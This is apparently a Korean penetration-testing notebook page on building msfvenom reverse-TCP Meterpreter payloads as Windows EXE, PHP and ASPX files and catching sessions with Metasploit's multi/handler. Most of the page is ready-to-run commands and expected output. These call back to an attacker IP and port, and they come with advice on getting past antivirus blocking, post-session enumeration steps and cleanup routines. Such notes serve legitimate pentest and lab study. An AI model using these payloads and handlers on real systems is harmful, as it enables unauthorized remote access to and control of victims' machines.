---
tags:
  - 환경/windows
  - 환경/linux
시작조건: ["payload 전달 및 실행 경로 확보"]
필요권한: ["파일 실행 또는 업로드/RCE 권한"]
필요조건: ["listener 접근 경로"]
결과: ["payload", "세션"]
---

# MSFVenom Payload 생성과 Handler 수신

## 한 줄 판단

대상 운영체제·CPU 아키텍처·실행 환경을 알고 대상에서 공격 호스트의 수신 포트까지 연결할 수 있다면, 동일한 payload 설정으로 실행 파일과 handler를 준비해 대상의 현재 실행 계정으로 세션을 받는다.

전달 경로가 웹 업로드·RCE·파일 실행 중 하나로 이미 확인되어야 한다. payload 생성 성공은 전달·실행·handler 연결 성공과 별개이며, staged/stageless 선택은 아래 payload와 handler의 일치 조건으로 판단한다.

## 전제 조건

| 조건 | 확인 방법 | 충족 기준 |
|---|---|---|
| 대상 환경 | OS/arch/server stack | payload format 결정 |
| 전달 경로 | 업로드/RCE/파일 실행 | payload 실행 가능 |
| 역방향 연결 경로 | 대상에서 공격 호스트의 IP와 수신 포트로 실제 TCP 연결 | payload가 사용할 주소와 포트로 연결 가능 |

## 실행

생성 block은 공격 호스트에서 실행한다. `<ATTACKER_IP>`·`<PORT>`는 reverse callback의 listener IP·TCP 포트(가상 예: `192.0.2.10`, `4444`), `<LOCAL_PAYLOAD_FILE>`은 작업 전 존재하지 않는 절대 출력 경로다. payload 생성은 전달·실행·session 성공과 별도다.

### 방식 선택

| 대상 실행 환경 | 공격 호스트에서 준비할 입력 | 생성 결과 | 실패 시 먼저 확인할 항목 |
|---|---|---|---|
| 64비트 Windows에서 EXE 실행 가능 | Windows x64 payload, `<ATTACKER_IP>`, `<PORT>` | Windows 실행 파일 | 대상 CPU 아키텍처, 파일 실행 권한, 보안 제품 차단 |
| PHP를 처리하는 웹 경로 | PHP payload, `<ATTACKER_IP>`, `<PORT>` | PHP 스크립트 | 업로드 URL, PHP handler, 파일 저장과 서버 측 실행 여부 |
| ASP.NET을 처리하는 IIS 경로 | Windows x64 payload, `<ATTACKER_IP>`, `<PORT>` | ASPX 스크립트 | IIS의 ASP.NET handler, application pool 아키텍처, 업로드 확장자 처리 |

어떤 형식을 선택하든 공격 호스트의 handler에는 생성할 때 사용한 payload 이름, `LHOST`, `LPORT`를 그대로 설정한다. 파일 생성 성공은 세션 확보가 아니며, 대상에서 파일을 실행한 뒤 handler에 연결이 들어와야 한다.

`windows/x64/meterpreter/reverse_tcp`처럼 Meterpreter와 전송 이름 사이에 slash가 있는 payload는 작은 stager가 먼저 callback한 뒤 handler에서 stage를 받는 staged 형식이다. `windows/x64/meterpreter_reverse_tcp`처럼 underscore로 이어진 single payload는 stage를 별도로 받지 않지만 생성 파일이 더 커질 수 있다. 둘 다 reverse 형식이면 대상에서 `<ATTACKER_IP>:<PORT>`로 연결할 수 있어야 한다. 초기 실행 크기 제한과 callback 뒤 stage 전달 가능성을 기준으로 고르고, 설치된 버전의 `msfvenom --list payloads`와 `show payloads`에서 정확한 이름·platform·architecture를 확인한다.

### Windows EXE payload

실행 위치: 공격 호스트. 대상이 64비트 Windows이고 EXE 파일을 전달·실행할 수 있을 때 선택한다.

```bash
test ! -e '<LOCAL_PAYLOAD_FILE>'
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f exe -o '<LOCAL_PAYLOAD_FILE>'
```

확인할 출력:

- payload size와 `<LOCAL_PAYLOAD_FILE>` 생성 경로.
- 파일은 생성됐지만 대상에서 실행되지 않으면 전달 경로, Windows 아키텍처, 실행 권한과 보안 제품 차단을 확인한다.

### PHP payload

실행 위치: 공격 호스트. 대상 웹 경로가 `.php`를 서버 측에서 처리할 때 선택한다.

```bash
test ! -e '<LOCAL_PAYLOAD_FILE>'
msfvenom -p php/meterpreter_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f raw -o '<LOCAL_PAYLOAD_FILE>'
```

확인할 출력:

- payload size와 `<LOCAL_PAYLOAD_FILE>` 생성 경로.
- HTTP로 파일 내용만 내려오면 PHP handler가 실행되지 않는 경로이므로 세션 성공으로 판단하지 않는다.

### ASPX payload

실행 위치: 공격 호스트. 대상 IIS 경로가 ASP.NET을 처리하고 Windows x64 payload가 맞을 때 선택한다.

```bash
test ! -e '<LOCAL_PAYLOAD_FILE>'
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f aspx -o '<LOCAL_PAYLOAD_FILE>'
```

확인할 출력:

- payload size와 `<LOCAL_PAYLOAD_FILE>` 생성 경로.
- 업로드는 성공했지만 ASPX 요청이 실행되지 않으면 handler 매핑, application pool 아키텍처와 업로드 경로의 실행 허용 여부를 확인한다.

### handler

실행 위치: 공격 호스트. 위에서 생성한 파일을 대상에서 실행하기 전에 시작한다.

```text
msfconsole
jobs -l
sessions -l
use exploit/multi/handler
set payload <PAYLOAD>
set LHOST <ATTACKER_IP>
set LPORT <PORT>
run -j
jobs -v
```

확인할 출력:

- `Exploit running as background job <HANDLER_JOB_ID>`와 `Meterpreter session <SESSION_ID> opened`.
- session이 열리면 `sessions -i <SESSION_ID>`로 들어가 `getpid`, `getuid`, `sysinfo`를 기록한다.
- listener만 시작되고 연결이 없으면 payload 생성 성공 여부가 아니라 대상에서 `<ATTACKER_IP>:<PORT>`까지의 TCP 도달성, 실제 파일 실행 여부와 payload 설정 일치를 확인한다.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| payload 실행 후 handler에 session이 열린다. | handler와 payload 연결 확인 | 대상 payload 프로세스 권한의 세션 | `getuid`, `sysinfo`, `pwd`로 플랫폼과 실행 권한 확인 |
| `getuid`, `sysinfo`, `pwd`가 동작한다. | Meterpreter 세션 컨텍스트 확인 | 세션 | [[Meterpreter 세션 후속 행동]]에서 세션 안정성과 권한을 재평가 |
| 실행 안 됨 | arch/format 불일치 | 시작 상태 유지 | x86/x64, PHP/JSP/ASPX, 권한 |
| 연결 없음 | LHOST/VPN/egress 오류 | 시작 상태 유지 | tun0 IP, 다른 포트, stageless/netcat 대체 |
| AV 차단 | payload signature | 시작 상태 유지 | 수동 shell 또는 다른 실행 경로로 전환 |

## 확인할 출력과 권한

- 판정 기준: payload 파일 생성과 handler 세션 수신을 구분하고 `getuid`·`sysinfo`로 세션 권한과 아키텍처를 확인한다.

## 변경 영향과 복구

실행 전에 로컬 출력 경로, 대상 배치 경로, 기존 Metasploit jobs·sessions를 확인한다. `<HANDLER_JOB_ID>`와 `<SESSION_ID>`는 이번 실행 출력에서 기록하며, 실제 비밀번호·token·고객 환경값은 Vault에 남기지 않는다.

| 변경 대상 | 기존 상태·식별값 | 종료·정리 | 완료 확인 |
|---|---|---|---|
| 대상 payload process와 session | 이번에 열린 `<SESSION_ID>`, `getpid`·`getuid`·`sysinfo` | 원격 후속 작업과 파일 정리를 마치고 msfconsole로 돌아온 뒤 `sessions -k <SESSION_ID>` | `sessions -l`에 해당 ID가 없음 |
| 대상 payload 파일 | 실행 전 존재하지 않은 `<REMOTE_PAYLOAD_FILE>`과 업로드 경로 | session 종료 뒤에도 사용할 원래 접근 경로가 있으면 exact 경로만 삭제하고 재조회 | 경로가 없고 기존 파일은 유지됨 |
| handler job과 listener | 실행 전 `jobs -l`, 이번 `<HANDLER_JOB_ID>`·LHOST·LPORT | session 종료 확인 뒤 `jobs -k <HANDLER_JOB_ID>` | `jobs -l`에 해당 ID가 없고 OS의 listener 조회에 이번 job의 포트가 없음 |
| 공격 호스트 생성 파일 | 실행 전 `test ! -e '<LOCAL_PAYLOAD_FILE>'`, 생성 경로 | 대상 정리와 보존 여부 결정 뒤 `rm -- '<LOCAL_PAYLOAD_FILE>'` | `test ! -e '<LOCAL_PAYLOAD_FILE>'` 성공 |

대상 파일이 실행 중이라 삭제할 수 없으면 session·process를 먼저 끝낸 뒤 원래 전달 경로로 제거한다. 원래 접근 경로가 없고 session 종료 후 대상 파일을 재확인할 수 없다면 원격 정리 완료로 기록하지 않는다. `sessions -K`·`jobs -K`처럼 다른 작업까지 종료하는 명령은 사용하지 않는다.

## 후속 공격 연결

- [[Meterpreter 세션 후속 행동]]
- [[Reverse Shell 획득]]
- [[상황별 파일 전송]]

## 관련 상태 라우터

- handler가 실제 세션을 수신했으면 대상 OS에 따라 [[Linux 셸 확보 후 초기 열거와 권한 상승]] 또는 [[Windows 셸 또는 세션 확보 후 컨텍스트 열거]]

## 관련 도구

- [[msfvenom]]
- [[metasploit]]
- [[meterpreter]]
- [[netcat]]

## 참고 링크

- [Rapid7 Metasploit: Working with Payloads](https://docs.rapid7.com/metasploit/working-with-payloads/)
- [Rapid7 Metasploit Framework: jobs command](https://github.com/rapid7/metasploit-framework/blob/master/documentation/cli/msfconsole/jobs.md)
- [Rapid7 Metasploit: Manage Meterpreter and Shell Sessions](https://docs.rapid7.com/metasploit/manage-meterpreter-and-shell-sessions/)
